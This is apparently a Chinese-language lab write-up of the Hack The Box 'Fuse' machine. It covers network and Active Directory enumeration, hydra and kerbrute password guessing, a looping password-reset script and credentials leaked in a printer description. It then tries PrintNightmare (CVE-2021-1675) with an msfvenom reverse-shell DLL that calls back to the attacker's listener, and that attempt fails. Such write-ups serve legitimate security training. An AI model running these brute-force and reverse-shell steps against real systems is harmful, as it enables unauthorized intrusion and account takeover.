kali 10.10.14.5

靶机 10.10.10.193

[HTB: Fuse | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#ldap---tcp-389)



```bash
└─# nmap -p- --min-rate 5555  10.10.10.193
└─# nmap -sC -sV -O -p 53,80,88,135,139,445,464,593,636,3268,3269,5985  10.10.10.193
```

```
PORT     STATE SERVICE           VERSION
53/tcp   open  tcpwrapped
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-09-15 02:50:07Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds      Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2023-09-14T19:51:03-07:00
| smb2-time: 
|   date: 2023-09-15T02:51:02
|_  start_date: 2023-09-15T02:48:18
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```



# 445 smb/rpc

```bash
└─# crackmapexec smb 10.10.10.193
[*] Initializing FTP protocol database
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
```

```bash
└─# smbmap -H 10.10.10.193
[+] IP: 10.10.10.193:445	Name: 10.10.10.193      
└─# smbmap -H 10.10.10.193 -u null
[!] 445 not open on 10.10.10.193....
```



```bash
└─# rpcclient -U '' -N 10.10.10.193
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```



# 53 dns

```bash
─# nslookup fuse.fabricorp.local 10.10.10.193                                                                                                                1 ⨯
Server:		10.10.10.193
Address:	10.10.10.193#53

Name:	fuse.fabricorp.local
Address: 10.10.10.193
Name:	fuse.fabricorp.local
Address: dead:beef::81cb:9e5b:ffa6:e0d5
Name:	fuse.fabricorp.local
Address: dead:beef::13b
```

```bash
└─# echo '10.10.10.193 fuse.fabricorp.local fabricorp.local' >> /etc/hosts
```



# 389 ldap

```bash
└─# ldapsearch -H LDAP://10.10.10.193 -x -s base namingcontexts                                                                                               1 ⨯
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=fabricorp,DC=local
namingContexts: CN=Configuration,DC=fabricorp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
└─# ldapsearch -H ldap://10.10.10.193 -x -b "DC=fabricorp,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=fabricorp,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

# numResponses: 1
```



# 80 web

跳转到 http://fuse.fabricorp.local/papercut/logs/html/index.htm

<img src=".\图片\Snipaste_2023-09-15_10-48-32.png" alt="Snipaste_2023-09-15_10-48-32" style="zoom:80%;" />

并且收集到一些用户名

```bash
└─# cat user.list                
pmerton
tlavel
sthompson
bhult
administrator
```

并且用社工工具生成一些字典

```bash
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers -m 8 > passoword.list
```



# 88 kerberos

尝试用 `kerbrute_linux_amd64` 爆破密码

先整理字典如 以下形式

<img src=".\图片\Snipaste_2023-09-15_11-01-56.png" alt="Snipaste_2023-09-15_11-01-56" style="zoom:80%;" />

```
username:password
```

```bash
for each in $(cat user.list);do for i in $(cat password.list);do echo $each:$i >> user_pass.list;done;done
```



```bash
└─# ./kerbrute_linux_amd64 bruteforce --dc 10.10.10.193 -d fabricorp.local  user_pass.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/14/23 - Ronnie Flathers @ropnop

2023/09/14 23:09:19 >  Using KDC(s):
2023/09/14 23:09:19 >  	10.10.10.193:88

2023/09/14 23:10:04 >  [!] sthompson@fabricorp.local:Wood - NETWORK ERROR - Can't talk to KDC. Aborting...
2023/09/14 23:10:13 >  Done! Tested 156 logins (0 successes) in 53.921 seconds
```

没有成功

它是根据匹对用户名和密码是否能生成票据来判定的，这种判定方式不全面，接下来使用 smb 爆破尝试



# Brute

```bash
└─# hydra -L user.list -P password.list  10.10.10.193 smb

[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
```

发现两对用户

```
tlavel:Fabricorp01
bhult:Fabricorp01
```



# Login Failures

先尝试登录 smb

失败

```bash
smbmap -u tlavel -p Fabricorp01 -H 10.10.10.193
smbmap -u bhult -p Fabricorp01 -H 10.10.10.193
```



```bash
└─# smbclient -U bhult -L \\\\10.10.10.193
Password for [WORKGROUP\bhult]:  Fabricorp01
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

```bash
└─# smbclient -U bhult -L \\\\10.10.10.193                                                                   
Password for [WORKGROUP\bhult]:   不输入密码直接回车
session setup failed: NT_STATUS_LOGON_FAILURE
```

发现要求提示换密码



修改密码 为 12345678

```
smbpasswd -r 10.10.10.193 bhult
```

登录 smb 

```
smbclient -U bhult -L \\\\10.10.10.193
```

发现成功，然而过一会就断了。原因是靶机过一分钟就把 bhult 的密码重置为 Fabricorp01 了，而且要提示你换密码



# Automation

所以现在最好的办法是动态修改不同的密码，然后登录 smb 提取重要信息，要用脚本完成才高效



```bash
if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi; [command here]
```

`0xdf.sh`：

```bash
if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi;
```



```bash
smbmap -H 10.10.10.193 -u bhult -p "$pass"
```

```bash
rpcclient -U bhult%${pass} 10.10.10.193

rpcclient $> querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein       Name: (null)    Desc: (null)
index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult        Name: (null)    Desc: (null)
index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson      Name: (null)    Desc: (null)
index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews     Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir        Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov    Name: (null)    Desc: (null)
index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton       Name: (null)    Desc: (null)
index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson     Name: (null)    Desc: (null)
index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print     Name: (null)    Desc: (null)
index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan      Name: (null)    Desc: (null)
index: 0x1095 RID: 0x642 acb: 0x00020010 Account: tlavel        Name: (null)    Desc: (null)
```

把用户名加到 user.list 字典里

```bash
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

得到一组账号密码

```
scan2docs:$fab@s3Rv1ce$1
```



其实这里还可以用修改密码后的用户 bhult 来使用  `enum4linux`  来枚举也可以成功



# crackmapexec

smb 登录失败

```bash
└─# smbmap -H 10.10.10.193 -u scan2docs -p '$fab@s3Rv1ce$1'
[!] Authentication error on 10.10.10.193
```



```bash
└─# crackmapexec smb 10.10.10.193 -u user.list -p '$fab@s3Rv1ce$1' --continue-on-success 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
```

得到账号密码

```bash
svc-print:$fab@s3Rv1ce$1 
```



# winrm

此时还可以尝试

<img src=".\图片\Snipaste_2023-09-15_12-32-18.png" alt="Snipaste_2023-09-15_12-32-18" style="zoom:67%;" />

```bash
evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
```



```powershell
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

# system

这题用的是打印机漏洞

[CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)



先生成木马

<img src=".\图片\Snipaste_2023-09-15_12-13-44.png" alt="Snipaste_2023-09-15_12-13-44" style="zoom:80%;" />

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.5 lport=1234 -f dll -o shell.dll
```



开启smb共享

```bash
└─# smbserver.py share .
```



kali 监听

```bash
└─# nc -lvnp 1234
```



```bash
└─# python CVE-2021-1675.py fabricorp.local/svc-print:$fab@s3Rv1ce$1@10.10.10.193 '\\10.10.14.5\share\shell.dll'
[*] Connecting to ncacn_np:10.10.10.193[\PIPE\spoolss]
[-] Connection Failed
```

利用失败了



难受。第一次连接 udp 的 vpn， 是不是 udp 丢包太严重了
